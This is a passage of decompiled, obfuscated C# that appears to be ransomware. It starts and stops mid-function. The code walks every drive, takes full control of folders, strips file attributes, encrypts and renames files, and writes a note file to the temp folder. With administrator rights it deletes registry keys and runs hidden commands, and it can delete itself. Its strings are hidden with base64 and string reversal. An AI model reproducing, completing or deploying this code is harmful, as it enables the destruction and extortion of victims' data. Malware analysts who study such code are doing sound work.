						{
							list.Add(fileInfo.FullName);
							buzqaFKfnRF(list, P_1, P_2, P_3, P_4);
							list.Clear();
						}
						else if (File.Exists(fileInfo.FullName) && kvJFoDYMuC == _0014(107397015))
						{
							list.Add(fileInfo.FullName);
							buzqaFKfnRF(list, P_1, P_2, P_3, P_4);
							list.Clear();
						}
					}
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static void GClBSyQehj()
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher(_0014(107388321));
		ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				if (!HoHveMjVjvX.Contains(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(_0014(107387756), _0014(107397192)).Replace(_0014(107387751), _0014(107387756))
					.Replace(_0014(107387742), _0014(107388695))
					.Split(new char[1] { '(' })[0].Trim()))
				{
					HoHveMjVjvX.Add(((object)val2.get_Path()).ToString()!.Split(new char[1] { '=' })[1].ToString().Replace(_0014(107387756), _0014(107397192)).Replace(_0014(107387751), _0014(107387756))
						.Replace(_0014(107387742), _0014(107388695))
						.Split(new char[1] { '(' })[0].Trim().Replace(_0014(107387705), _0014(107388695)));
				}
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string KXNiSRaxzeIpPt(string MpIHQdZxSklG = "", string EwWvQBHwErAjymKr = "")
	{
		string result = _0014(107388695);
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = MpIHQdZxSklG,
				Arguments = EwWvQBHwErAjymKr,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit(2500);
			process2.Kill();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void xcFsifoFernH(string P_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = _0014(107387696),
			Arguments = P_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string VSGqbgWciAAQ(string P_0)
	{
		char[] array = P_0.ToCharArray();
		Array.Reverse((Array)array);
		return new string(array);
	}

	public static string GwTsezEgVAuVAU(string P_0)
	{
		byte[] bytes = Convert.FromBase64String(P_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void AiwyVzAQMcDi(string P_0)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = GwTsezEgVAuVAU(_0014(107387711));
		processStartInfo.Arguments = _0014(107387682) + P_0;
		processStartInfo.RedirectStandardError = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}

	private static bool BDTFnPeiNCX(string P_0, string P_1)
	{
		try
		{
			FileSystemAccessRule rule = new FileSystemAccessRule(P_0, FileSystemRights.FullControl, InheritanceFlags.None, PropagationFlags.NoPropagateInherit, AccessControlType.Allow);
			DirectoryInfo directoryInfo = new DirectoryInfo(P_1);
			DirectorySecurity accessControl = directoryInfo.GetAccessControl(AccessControlSections.Access);
			accessControl.ModifyAccessRule(AccessControlModification.Set, rule, out var modified);
			if (!modified)
			{
				return false;
			}
			rule = new FileSystemAccessRule(P_0, FileSystemRights.FullControl, InheritanceFlags.ContainerInherit | InheritanceFlags.ObjectInherit, PropagationFlags.InheritOnly, AccessControlType.Allow);
			accessControl.ModifyAccessRule(AccessControlModification.Add, rule, out modified);
			if (!modified)
			{
				return false;
			}
			directoryInfo.SetAccessControl(accessControl);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static string cYzqjSUrbP(SecureString P_0)
	{
		string empty = string.Empty;
		IntPtr intPtr = Marshal.SecureStringToBSTR(P_0);
		try
		{
			return Marshal.PtrToStringBSTR(intPtr);
		}
		finally
		{
			Marshal.ZeroFreeBSTR(intPtr);
		}
	}

	public static void UQZfYOBEqlkpb()
	{
		try
		{
			if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				return;
			}
			string text = VSGqbgWciAAQ(_0014(107387677));
			try
			{
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(GwTsezEgVAuVAU(text), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(_0014(107387507)));
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(_0014(107387994)));
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(_0014(107388009)));
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(_0014(107387952)));
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(_0014(107387711)));
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(_0014(107387927)));
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(_0014(107387898)));
					registryKey.Close();
				}
				text = VSGqbgWciAAQ(_0014(107387913));
				registryKey = Registry.LocalMachine.OpenSubKey(GwTsezEgVAuVAU(text), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(_0014(107387816)));
					registryKey.Close();
				}
				text = VSGqbgWciAAQ(_0014(107387767));
				registryKey = Registry.LocalMachine.OpenSubKey(GwTsezEgVAuVAU(text), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(_0014(107387816)));
					registryKey.Close();
				}
				text = VSGqbgWciAAQ(_0014(107387767));
				registryKey = Registry.CurrentUser.OpenSubKey(GwTsezEgVAuVAU(text), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(GwTsezEgVAuVAU(_0014(107387816)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107387782)), GwTsezEgVAuVAU(_0014(107387221)));
			KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107387204)), GwTsezEgVAuVAU(_0014(107387163)));
			KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107387204)), GwTsezEgVAuVAU(_0014(107387049)));
			KXNiSRaxzeIpPt(GwTsezEgVAuVAU(_0014(107387500)), GwTsezEgVAuVAU(_0014(107387451)));
		}
		catch
		{
		}
	}

	public static void KGSDHYAAGYu(string P_0, byte[] P_1)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(GwTsezEgVAuVAU(_0014(107387378)));
			using FileStream fileStream = new FileStream(P_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(P_1, 0, P_1.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void NzZJHUVbSXZd()
	{
		string text = VSGqbgWciAAQ(_0014(107387353));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(GwTsezEgVAuVAU(text), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(GwTsezEgVAuVAU(_0014(107387304)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void yQfvyropwD()
	{
		KXNiSRaxzeIpPt(_0014(107396997), GwTsezEgVAuVAU(_0014(107387271)));
		string text = GwTsezEgVAuVAU(_0014(107386565));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = _0014(107387742) + text + _0014(107387742) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = _0014(107396997);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void VmNlRJHbsFKpwZ(string P_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(P_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(P_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(P_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(P_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, _0014(107386500) + P_0 + _0014(107386971) + ex.Message + _0014(107396288));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string PAhtGWwudbxozQK()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = _0014(107388695);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 0:
				text = _0014(107386942);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == _0014(107386905))) ? _0014(107386919) : _0014(107386896));
				break;
			case 90:
				text = _0014(107386914);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = _0014(107386909);
				break;
			case 4:
				text = _0014(107386864);
				break;
			case 5:
				text = ((version.Minor != 0) ? _0014(107386878) : _0014(107386887));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? _0014(107386854) : _0014(107386859)) : _0014(107386832)) : _0014(107386841));
				break;
			case 10:
				text = _0014(107386849);
				break;
			}
		}
		if (text != _0014(107388695))
		{
			text = _0014(107386812) + text;
			if (oSVersion.ServicePack != _0014(107388695))
			{
				text = text + _0014(107386799) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string mpBrVYdLlDe(string P_0)
	{
		string text = Path.GetTempPath() + _0014(107395397);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(GwTsezEgVAuVAU(_0014(107395364)));
				streamWriter.WriteLine(_0014(107396288));
				streamWriter.WriteLine(GwTsezEgVAuVAU(_0014(107393418)));
				streamWriter.WriteLine(P_0);
				if (MiZHZrKmtKkaPXn)
				{
					streamWriter.WriteLine(_0014(107396288));
					streamWriter.WriteLine(GwTsezEgVAuVAU(_0014(107392764)));
					streamWriter.WriteLine(GyWbmViNanxKl.nFyAFAYBITHjh());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(P_0) && !IooTTsvIiwCN)
				{
					File.AppendAllText(text, _0014(107392731) + P_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (joesCNAxeHUI)
			{
				try
				{
					File.AppendAllText(jnRLNtXuRRg, _0014(107386826) + ex.Message + _0014(107396288));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void gwzRtxANhzJ(string[] P_0, string[] P_1, string[] P_2, string P_3, string P_4)
	{
		qZMjyZfSuemhC.DCzjcOwiJDl CS_0024_003C_003E8__locals0 = new qZMjyZfSuemhC();
		CS_0024_003C_003E8__locals0.gEhXXIzChk = P_1;
		CS_0024_003C_003E8__locals0.WLgJdVMBruB = P_2;
		CS_0024_003C_003E8__locals0.wxfrhJHvjWjHlu = P_3;
		CS_0024_003C_003E8__locals0.sZqoWBfJdvFIl = P_4;
		lrVhqMPbYlaOK = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.wxfrhJHvjWjHlu);
		DriveInfo[] array = null;
		if (P_0[0] == _0014(107396504))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !HoHveMjVjvX.Contains(array[i].Name))
					{
						HoHveMjVjvX.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < P_0.Length; j++)
			{
				if (!HoHveMjVjvX.Contains(P_0[j]))
				{
					HoHveMjVjvX.Add(P_0[j]);
				}
			}
		}
		if (HoHveMjVjvX.Contains(GwTsezEgVAuVAU(_0014(107386737))) && rHeEvpAbjCjyvEaC == _0014(107396855))
		{
			HoHveMjVjvX.Remove(GwTsezEgVAuVAU(_0014(107386737)));
		}
		Parallel.ForEach(HoHveMjVjvX, delegate(string P_0)
		{
			CS_0024_003C_003E8__locals0 = new qZMjyZfSuemhC.DCzjcOwiJDl();
			CS_0024_003C_003E8__locals0.APrnMdZiEm = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM = P_0;
			if (upflSQRmeWP && !PAhtGWwudbxozQK().Contains(qZMjyZfSuemhC._008B(107386888)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						BDTFnPeiNCX(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (iEHeKlEPYHGI == qZMjyZfSuemhC._008B(107396865))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					HGTRyKvTZjusOL(CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM, CS_0024_003C_003E8__locals0.APrnMdZiEm.gEhXXIzChk, CS_0024_003C_003E8__locals0.APrnMdZiEm.sZqoWBfJdvFIl, CS_0024_003C_003E8__locals0.APrnMdZiEm.WLgJdVMBruB, CS_0024_003C_003E8__locals0.APrnMdZiEm.wxfrhJHvjWjHlu);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				HGTRyKvTZjusOL(CS_0024_003C_003E8__locals0.NyPtOimZdkEdllM, CS_0024_003C_003E8__locals0.gEhXXIzChk, CS_0024_003C_003E8__locals0.sZqoWBfJdvFIl, CS_0024_003C_003E8__locals0.WLgJdVMBruB, CS_0024_003C_003E8__locals0.wxfrhJHvjWjHlu);
			}
		});
	}

	public static void HGTRyKvTZjusOL(string P_0, string[] P_1, string P_2, string[] P_3, string P_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(_0014(107388695));
		List<string> list3 = list2;
		if (VsxmPTvejQSFs == _0014(107397015))
		{
			list = bUTxlfgHAvCR(P_0, P_1, P_2, P_3, P_4);
			return;
		}
		list = RAjgPCVHZF.SearchFiles(P_0);
		foreach (string text in P_1)
		{
			foreach (string item in list)
			{
				if (P_3.Length != 0)
				{
					foreach (string value in P_3)
					{
						if (item.EndsWith(value))
						{
							goto IL_039c;
						}
					}
				}
				if ((ltuxRtIPjttT == _0014(107397015) && !item.EndsWith(text)) || yGkMwQPqUdXIj.Contains(item))
				{
					continue;
				}
				if (cySCSfjuDKIn == _0014(107396855))
				{
					try
					{
						if (NqaDDCCMEbCxV.SmlSZjnRIeVP(item))
						{
							NqaDDCCMEbCxV.XkoarExxofRiBeK(item);
						}
					}
					catch
					{
					}
				}
				yGkMwQPqUdXIj.Add(item);
				if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(item)))
				{
					SlSeSNfJnzNh.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (CdQMIPJOkrOUDSy == _0014(107396855) && fileStream.Length > Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024 && !list3.Contains(text))
					{
						if (bxhZXFvKXZl == _0014(107396855))
						{
							foreach (string item2 in EKjYgfCTgvyfhvOPx)
							{
								if (item.ToLower().EndsWith(item2) && vEWBFQaTPDgk == _0014(107396855))
								{
									if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											GyWbmViNanxKl.DGdOiIgzOMW(_0014(107389320), _0014(107389315), _0014(107388758), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && vEWBFQaTPDgk == _0014(107397015))
								{
									try
									{
										GyWbmViNanxKl.DGdOiIgzOMW(_0014(107389320), _0014(107389315), _0014(107388758), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] array = fkozHCDTDrY.OlBXyEPnCYpDO(item, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
						byte[] quwoLGzcjeGYg = fkozHCDTDrY.GVHcoGquozRzL(array, Encoding.ASCII.GetBytes(P_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						fkozHCDTDrY.wXhdORmUgbGuB(item, quwoLGzcjeGYg);
						if (P_2 != _0014(107386760))
						{
							File.Move(item, item + P_2);
						}
					}
					else if (P_2 != _0014(107386760))
					{
						BrOZVHevqxbaV(item, item + P_2, lrVhqMPbYlaOK);
					}
					else
					{
						BrOZVHevqxbaV(item, item + _0014(107386755), lrVhqMPbYlaOK);
					}
				}
				catch (Exception)
				{
				}
				IL_039c:;
			}
		}
	}

	public static void buzqaFKfnRF(List<string> P_0, string[] P_1, string P_2, string[] P_3, string P_4)
	{
		kFfBlUyayStE.YUIjdATTEVIX CS_0024_003C_003E8__locals0 = new kFfBlUyayStE();
		CS_0024_003C_003E8__locals0.WNvdcTPDgW = P_0;
		CS_0024_003C_003E8__locals0.ZDxRrpKTbd = P_2;
		CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW = P_3;
		CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ = P_4;
		CS_0024_003C_003E8__locals0.ZfHQdOmNHVP = new List<string> { _0014(107388695) };
		if (ltuxRtIPjttT == _0014(107397015))
		{
			Parallel.ForEach(P_1, delegate(string P_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.WNvdcTPDgW)
				{
					if (CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW.Length != 0)
					{
						string[] dXgeOiXUaNyFEW2 = CS_0024_003C_003E8__locals0.dXgeOiXUaNyFEW;
						int num2 = 0;
						while (num2 < dXgeOiXUaNyFEW2.Length)
						{
							string value2 = dXgeOiXUaNyFEW2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_09d7;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.ZDxRrpKTbd))
						{
							goto IL_09d7;
						}
					}
					catch (Exception)
					{
						goto IL_09d7;
					}
					if (item.EndsWith(P_0) && !yGkMwQPqUdXIj.Contains(item))
					{
						if (cySCSfjuDKIn == kFfBlUyayStE._0082(107396873))
						{
							try
							{
								if (NqaDDCCMEbCxV.SmlSZjnRIeVP(item))
								{
									NqaDDCCMEbCxV.XkoarExxofRiBeK(item);
								}
							}
							catch
							{
							}
						}
						yGkMwQPqUdXIj.Add(item);
						if (!SlSeSNfJnzNh.Contains(Path.GetDirectoryName(item)))
						{
							SlSeSNfJnzNh.Add(Path.GetDirectoryName(item));
						}
						VmNlRJHbsFKpwZ(item);
						try
						{
							new vyQYEsUfMyGoFM().rjhwntJsrm(item);
						}
						catch
						{
						}
						try
						{
							using FileStream fileStream2 = new FileStream(item, FileMode.Open, FileAccess.Write);
							if (!fileStream2.CanWrite)
							{
								try
								{
									if (qoRjYABduZF)
									{
										Console.WriteLine(kFfBlUyayStE._0082(107403564) + item + kFfBlUyayStE._0082(107403519) + new FileInfo(item).Length + kFfBlUyayStE._0082(107403498));
										Console.WriteLine(kFfBlUyayStE._0082(107403489));
									}
								}
								catch
								{
								}
								KXNiSRaxzeIpPt(GwTsezEgVAuVAU(kFfBlUyayStE._0082(107403416)), kFfBlUyayStE._0082(107387760) + item + kFfBlUyayStE._0082(107387760) + GwTsezEgVAuVAU(kFfBlUyayStE._0082(107403871)) + kFfBlUyayStE._0082(107387760) + Environment.UserName + kFfBlUyayStE._0082(107387760) + GwTsezEgVAuVAU(kFfBlUyayStE._0082(107403854)));
							}
						}
						catch (Exception ex18)
						{
							if (joesCNAxeHUI)
							{
								try
								{
									File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE._0082(107386518) + item + kFfBlUyayStE._0082(107403861) + ex18.Message + kFfBlUyayStE._0082(107396306));
								}
								catch (Exception)
								{
								}
							}
							continue;
						}
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0)
								{
									goto end_IL_02ca;
								}
								goto end_IL_02ca_2;
								end_IL_02ca:;
							}
							catch (Exception ex20)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE._0082(107386518) + item + kFfBlUyayStE._0082(107403748) + ex20.Message + kFfBlUyayStE._0082(107396306));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								goto end_IL_02ca_2;
							}
							if (!(CdQMIPJOkrOUDSy == kFfBlUyayStE._0082(107396873)) || new FileInfo(item).Length <= Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024 || CS_0024_003C_003E8__locals0.ZfHQdOmNHVP.Contains(P_0))
							{
								if (MiZHZrKmtKkaPXn)
								{
									CS_0024_003C_003E8__locals0.ZDxRrpKTbd = RBZnAGRnuwHeRmi + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
								}
								string text3 = AnLYutpDjmCX.cVQEpGjgoi(32);
								string s3 = FlpXYRWvTX.ZTvekdOmyg(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE._0082(107386778))
								{
									if (!EcdpqbMrQOzfdgL)
									{
										if (!IooTTsvIiwCN)
										{
											GKkFnjoUAoXGqN(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, lrVhqMPbYlaOK);
										}
										else
										{
											GKkFnjoUAoXGqN(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, Encoding.ASCII.GetBytes(text3));
										}
									}
									else
									{
										try
										{
											if (!IooTTsvIiwCN)
											{
												IzvDPVDWsNMZj(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, lrVhqMPbYlaOK);
											}
											else
											{
												IzvDPVDWsNMZj(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, Encoding.ASCII.GetBytes(text3));
											}
										}
										catch (Exception ex22)
										{
											if (joesCNAxeHUI)
											{
												try
												{
													File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE._0082(107386518) + item + kFfBlUyayStE._0082(107386220) + ex22.Message + kFfBlUyayStE._0082(107396306));
												}
												catch (Exception)
												{
												}
											}
											iePhSHBTqLd++;
											try
											{
												File.Move(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, item);
											}
											catch (Exception)
											{
											}
											goto end_IL_02ca_2;
										}
									}
								}
								else if (!EcdpqbMrQOzfdgL)
								{
									if (!IooTTsvIiwCN)
									{
										GKkFnjoUAoXGqN(item, item + kFfBlUyayStE._0082(107386773), lrVhqMPbYlaOK);
									}
									else
									{
										GKkFnjoUAoXGqN(item, item + kFfBlUyayStE._0082(107386773), Encoding.ASCII.GetBytes(text3));
									}
								}
								else
								{
									try
									{
										if (!IooTTsvIiwCN)
										{
											IzvDPVDWsNMZj(item, item, lrVhqMPbYlaOK);
										}
										else
										{
											IzvDPVDWsNMZj(item, item, Encoding.ASCII.GetBytes(text3));
										}
									}
									catch (Exception ex25)
									{
										if (joesCNAxeHUI)
										{
											try
											{
												File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE._0082(107386518) + item + kFfBlUyayStE._0082(107386220) + ex25.Message + kFfBlUyayStE._0082(107396306));
											}
											catch (Exception)
											{
											}
										}
										iePhSHBTqLd++;
										goto end_IL_02ca_2;
									}
								}
								if (IooTTsvIiwCN)
								{
									if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE._0082(107386778))
									{
										KGSDHYAAGYu(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, bytes3);
									}
									else
									{
										KGSDHYAAGYu(item, bytes3);
									}
								}
								goto IL_09d7;
							}
							CS_0024_003C_003E8__locals0 = new kFfBlUyayStE.knpMjkNPiIY();
							CS_0024_003C_003E8__locals0.JhmFrwpsOrTq = CS_0024_003C_003E8__locals0;
							try
							{
								if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE._0082(107386778))
								{
									if (MiZHZrKmtKkaPXn)
									{
										CS_0024_003C_003E8__locals0.ZDxRrpKTbd = RBZnAGRnuwHeRmi + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
									}
									File.Move(item, item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd);
								}
							}
							catch (Exception ex27)
							{
								if (joesCNAxeHUI)
								{
									try
									{
										File.AppendAllText(jnRLNtXuRRg, kFfBlUyayStE._0082(107386518) + item + kFfBlUyayStE._0082(107403687) + ex27.Message + kFfBlUyayStE._0082(107396306));
									}
									catch (Exception)
									{
									}
								}
								iePhSHBTqLd++;
								goto end_IL_02ca_2;
							}
							CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = kFfBlUyayStE._0082(107388713);
							if (CS_0024_003C_003E8__locals0.ZDxRrpKTbd != kFfBlUyayStE._0082(107386778))
							{
								CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd;
							}
							else
							{
								CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX = item;
							}
							if (bxhZXFvKXZl == kFfBlUyayStE._0082(107396873))
							{
								Thread thread2 = new Thread((ThreadStart)delegate
								{
									foreach (string item2 in EKjYgfCTgvyfhvOPx)
									{
										if (CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.JhmFrwpsOrTq.ZDxRrpKTbd) && vEWBFQaTPDgk == kFfBlUyayStE.knpMjkNPiIY._001D(107396876))
										{
											if (Convert.ToInt32(PyFcFDpqJkSW) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX).Length)
											{
												try
												{
													GyWbmViNanxKl.DGdOiIgzOMW(kFfBlUyayStE.knpMjkNPiIY._001D(107389341), kFfBlUyayStE.knpMjkNPiIY._001D(107389336), kFfBlUyayStE.knpMjkNPiIY._001D(107388779), CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX.ToLower().EndsWith(item2) && vEWBFQaTPDgk == kFfBlUyayStE.knpMjkNPiIY._001D(107397036))
										{
											try
											{
												GyWbmViNanxKl.DGdOiIgzOMW(kFfBlUyayStE.knpMjkNPiIY._001D(107389341), kFfBlUyayStE.knpMjkNPiIY._001D(107389336), kFfBlUyayStE.knpMjkNPiIY._001D(107388779), CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX);
											}
											catch
											{
											}
										}
									}
								});
								thread2.Priority = ThreadPriority.Normal;
								thread2.IsBackground = false;
								thread2.Start();
							}
							string text4 = AnLYutpDjmCX.cVQEpGjgoi(32);
							string s4 = FlpXYRWvTX.ZTvekdOmyg(text4);
							byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
							if (QGAYpwMzxm == kFfBlUyayStE._0082(107397033))
							{
								byte[] array3 = null;
								byte[] array4 = fkozHCDTDrY.OlBXyEPnCYpDO(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, Convert.ToInt32(xYkYbBCyjIxz) * 1024 * 1024);
								if (fkozHCDTDrY.wXhdORmUgbGuB(quwoLGzcjeGYg: (!VGKELVlTFUV) ? (IooTTsvIiwCN ? fkozHCDTDrY.GVHcoGquozRzL(array4, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : fkozHCDTDrY.GVHcoGquozRzL(array4, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (IooTTsvIiwCN ? RpWKlAyYXuFg.pUQagweWpoRi(array4, Encoding.ASCII.GetBytes(text4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : RpWKlAyYXuFg.pUQagweWpoRi(array4, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZsIFKCtaED: CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, TTsauZziAEbN: bytes4))
								{
									goto IL_09d7;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, item);
								}
								catch (Exception)
								{
								}
							}
							else if (!IooTTsvIiwCN)
							{
								if (dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, xYkYbBCyjIxz, CS_0024_003C_003E8__locals0.nyAmnOdcSzzfJ))
								{
									goto IL_09d7;
								}
								try
								{
									File.Move(item + CS_0024_003C_003E8__locals0.ZDxRrpKTbd, item);
								}
								catch (Exception)
								{
								}
							}
							else
							{
								if (dsNajfALrLtCLf.PPfLKlDWqkz(CS_0024_003C_003E8__locals0.JqgYVVMwzVoNzX, xYkYbBCyjIxz, text4, bytes4))
								{
									goto IL_09d7;
								}
								try
								{
